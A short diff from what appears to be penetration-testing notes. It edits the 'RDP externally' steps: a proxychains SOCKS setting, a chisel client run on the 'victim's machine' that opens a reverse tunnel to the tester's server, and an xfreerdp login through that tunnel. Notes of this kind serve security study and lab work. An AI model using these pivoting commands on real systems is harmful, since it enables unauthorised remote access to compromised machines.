@@ -186,8 +186,8 @@ In meterpreter with administrator privs to enable RDP :
 RDP externally :
 sudo nano /etc/proxychains4.conf
 dynamic_chain 
-socks5 127.0.0.1 <1080>
-on victim's machine chisel.exe client <ip>:<port> R:1080:socks
+socks5 127.0.0.1 1080
+on victim's machine chisel.exe client <ip>:<port> R:socks
 from new terminal --> chisel server -p <forwarded port 4444> --reverse
 proxychains4 xfreerdp /u:<user> /v:<local ip> /p:<password>
 ---------------------------------------------------------------------------------------------------------------
